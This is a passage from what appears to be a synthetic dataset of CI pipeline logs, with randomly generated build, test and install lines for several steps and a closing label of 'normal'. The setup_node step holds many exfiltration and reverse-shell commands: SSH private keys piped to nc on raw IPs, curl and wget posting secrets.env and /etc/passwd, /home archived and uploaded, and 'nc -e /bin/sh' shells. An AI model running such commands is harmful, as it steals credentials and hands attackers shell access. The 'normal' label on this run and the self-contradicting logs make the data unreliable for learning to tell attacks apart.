          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_auth_login (389ms)",
          "Compiling src/index.js...",
          "[12:00:22] INFO: Processing request",
          "\u2713 test completed",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Step 10/10: Building",
          "Compiling src/handler.rs...",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-04T12:01:44.242676",
        "finished_at": "2025-12-04T12:02:06.499746",
        "log_lines": [
          "=== Step: build ===",
          "\u2713 test completed",
          "Installing jest@4.10.0",
          "\u2713 test completed",
          "\u2713 test completed",
          "  PASS: test_db_connect (450ms)",
          "Compiling src/index.js...",
          "WARNING: jest has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-3724",
          "  PASS: test_auth_login (386ms)",
          "Compiling src/main.py...",
          "[12:00:22] INFO: Processing request",
          "\u2717 build failed with exit code 31",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (11ms)",
          "Step 3/10: Building",
          "Cache hit for key-5574",
          "[12:00:22] INFO: Processing request",
          "Step 5/10: Building",
          "\u2713 build completed",
          "  PASS: test_user_create (292ms)",
          "\u2713 test completed",
          "Step 2/10: Building",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "Step 4/10: Building",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (317ms)",
          "Cache hit for key-6522",
          "FAILED: test_cache_hit",
          "[12:00:22] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Cache hit for key-7652",
          "  PASS: test_user_create (453ms)",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-6779",
          "  PASS: test_user_create (211ms)",
          "FAILED: test_user_create",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_auth_login (373ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:00:22] INFO: Processing request",
          "Step 9/10: Building",
          "WARNING: express has known vulnerabilities",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing axios@3.18.0",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_cache_hit (127ms)",
          "[12:00:22] INFO: Processing request",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Cache hit for key-8665",
          "Cache hit for key-3737",
          "Step 5/10: Building",
          "[12:00:22] INFO: Processing request",
          "Step 8/10: Building",
          "Compiling src/handler.rs...",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (243ms)",
          "[12:00:22] INFO: Processing request",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (228ms)",
          "Installing axios@3.13.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache hit for key-6584",
          "  PASS: test_cache_hit (32ms)",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_cache_hit (192ms)",
          "Installing eslint@3.19.0",
          "Compiling src/app.ts...",
          "Installing express@5.4.0",
          "Step 10/10: Building",
          "  PASS: test_cache_hit (429ms)",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Cache hit for key-4489",
          "  PASS: test_api_health (343ms)",
          "Exception: TypeError",
          "Cache hit for key-4872",
          "Cache hit for key-3032",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "Installing webpack@3.20.0",
          "  PASS: test_user_create (461ms)",
          "[12:00:22] ERROR: Connection failed",
          "Cache hit for key-5391",
          "  PASS: test_db_connect (402ms)",
          "Cache hit for key-3888",
          "\u2713 test completed",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "\u2713 test completed",
          "Installing axios@3.5.0",
          "FAILED: test_auth_login",
          "  PASS: test_api_health (116ms)",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-04T12:02:06.499746",
        "finished_at": "2025-12-04T12:02:28.756816",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "\u2713 test completed",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:22] INFO: Processing request",
          "Step 4/10: Building",
          "Cache hit for key-8918",
          "  PASS: test_user_create (107ms)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing jest@4.7.0",
          "Cache hit for key-5383",
          "Step 4/10: Building",
          "Cache hit for key-7863",
          "[12:00:22] INFO: Processing request",
          "\u2713 test completed",
          "WARNING: jest has known vulnerabilities",
          "\u2713 test completed",
          "  PASS: test_cache_hit (192ms)",
          "Step 1/10: Building",
          "  PASS: test_auth_login (194ms)",
          "Cache hit for key-4745",
          "Step 7/10: Building",
          "Installing prettier@2.3.0",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u2713 test completed",
          "Cache hit for key-2706",
          "[12:00:22] INFO: Processing request",
          "Installing react@1.3.0",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Step 2/10: Building",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Step 6/10: Building",
          "Compiling src/utils.go...",
          "Step 2/10: Building",
          "Installing eslint@1.14.0",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_api_health (379ms)",
          "  PASS: test_auth_login (170ms)",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-8681",
          "Compiling src/app.ts...",
          "Step 2/10: Building",
          "Step 10/10: Building",
          "\u2713 test completed",
          "Installing webpack@4.11.0",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 build completed",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Step 2/10: Building",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Installing prettier@4.2.0",
          "Step 6/10: Building",
          "Cache hit for key-4024",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:22] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:22] INFO: Processing request",
          "Installing react@4.8.0",
          "  PASS: test_api_health (497ms)",
          "Step 9/10: Building",
          "[12:00:22] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing lodash@5.19.0",
          "[12:00:22] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Step 6/10: Building",
          "Step 2/10: Building",
          "Cache hit for key-6320",
          "Compiling src/main.py...",
          "Installing lodash@5.16.0",
          "  PASS: test_auth_login (427ms)",
          "Installing axios@1.15.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "FAILED: test_db_connect",
          "Installing react@4.11.0",
          "Step 5/10: Building",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "Installing lodash@5.12.0",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_db_connect (325ms)",
          "Cache hit for key-3957",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Cache hit for key-5446",
          "\u2713 lint completed",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/utils.go...",
          "Installing jest@1.20.0",
          "Step 8/10: Building",
          "\u2713 test completed",
          "Installing webpack@1.11.0",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-04T12:02:28.756816",
        "finished_at": "2025-12-04T12:02:36.175839",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_user_create (142ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Step 5/10: Building",
          "Compiling src/handler.rs...",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing axios@1.6.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-1254",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/service.java...",
          "Installing prettier@4.3.0",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Step 2/10: Building",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_api_health (452ms)",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-2967",
          "[12:00:22] INFO: Processing request",
          "Exception: ValueError",
          "  PASS: test_auth_login (286ms)",
          "Compiling src/handler.rs...",
          "FAILED: test_api_health",
          "Step 6/10: Building",
          "[12:00:22] INFO: Processing request",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 54",
          "  PASS: test_db_connect (499ms)",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u2713 test completed",
          "  PASS: test_api_health (96ms)",
          "  PASS: test_auth_login (200ms)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-7008",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_db_connect (44ms)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Installing eslint@1.15.0",
          "Step 6/10: Building",
          "  PASS: test_api_health (316ms)",
          "Step 10/10: Building",
          "Cache hit for key-8587",
          "Cache hit for key-7929",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (76ms)",
          "\u2713 build completed",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (51ms)",
          "  PASS: test_cache_hit (145ms)",
          "Cache hit for key-6849",
          "Cache hit for key-5441",
          "Cache hit for key-5544",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 1/10: Building",
          "  PASS: test_db_connect (473ms)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Installing webpack@4.20.0",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Installing eslint@3.19.0",
          "[12:00:22] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-3709",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (367ms)",
          "\u2713 build completed",
          "  PASS: test_api_health (173ms)",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_db_connect (64ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_api_health (469ms)",
          "Installing webpack@4.3.0",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-3919",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (481ms)",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (196ms)",
          "Compiling src/app.ts...",
          "Installing react@3.11.0",
          "  PASS: test_user_create (408ms)",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (85ms)",
          "Compiling src/service.java...",
          "Cache hit for key-3043",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:22] INFO: Processing request",
          "\u2717 build failed with exit code 87",
          "[12:00:22] WARN: Deprecated API usage",
          "Cache hit for key-5450",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-04T12:02:36.175839",
        "finished_at": "2025-12-04T12:02:43.594862",
        "log_lines": [
          "=== Step: setup_node ===",
          "Step 7/10: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 93.82.39.27 43713",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:22] INFO: Processing request",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Artifact uploaded: build.tar.gz (2MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Cache hit for key-7247",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Step 9/10: Building",
          "[12:00:22] INFO: Processing request",
          "Step 1/10: Building",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Compiling src/utils.go...",
          "Step 8/10: Building",
          "Compiling src/main.py...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 121.119.27.119 28341",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Installing axios@5.18.0",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 lint completed",
          "Installing axios@4.0.0",
          "Installing prettier@1.2.0",
          "  PASS: test_user_create (304ms)",
          "Step 7/10: Building",
          "\u2713 test completed",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Step 4/10: Building",
          "Cache hit for key-6326",
          "Step 8/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 build completed",
          "\u2713 build completed",
          "nc -e /bin/sh 15.167.31.47 22092",
          "  PASS: test_api_health (335ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "FAILED: test_api_health",
          "Sending 281MB of data to startup.dev",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing react@3.6.0",
          "Step 2/10: Building",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_db_connect (407ms)",
          "[12:00:22] ERROR: Connection failed",
          "Installing express@1.13.0",
          "[12:00:22] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 build completed",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Step 8/10: Building",
          "Step 9/10: Building",
          "Compiling src/service.java...",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Installing express@4.18.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "  PASS: test_auth_login (424ms)",
          "  PASS: test_db_connect (305ms)",
          "Step 5/10: Building",
          "Installing webpack@1.17.0",
          "\u2713 test completed",
          "Cache hit for key-8141",
          "[12:00:22] WARN: Deprecated API usage",
          "[12:00:22] WARN: Deprecated API usage",
          "[12:00:22] INFO: Processing request",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 3/10: Building",
          "Cache hit for key-7330",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_auth_login (7ms)",
          "Cache hit for key-7973",
          "  PASS: test_db_connect (319ms)",
          "WARNING: webpack has known vulnerabilities",
          "Step 10/10: Building",
          "nc -e /bin/sh 49.250.174.117 12244",
          "Cache hit for key-2396",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "nc -e /bin/sh 56.153.247.40 32535",
          "[12:00:22] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "[12:00:22] INFO: Processing request",
          "Installing axios@1.20.0",
          "Compiling src/main.py...",
          "Installing express@5.19.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 10/10: Building",
          "FAILED: test_cache_hit",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Cache hit for key-8026",
          "[12:00:22] INFO: Processing request",
          "Step 5/10: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 155.167.148.232 31454",
          "Cache hit for key-7517",
          "\u2713 build completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 230.103.40.203 65015",
          "  PASS: test_auth_login (50ms)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing eslint@3.15.0",
          "nc -e /bin/sh 101.53.153.248 64072",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 249.2.138.172 46042",
          "Cache hit for key-5156",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-9816",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 163.167.112.17 41160",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:00:22] INFO: Processing request",
          "=== Step setup_node completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}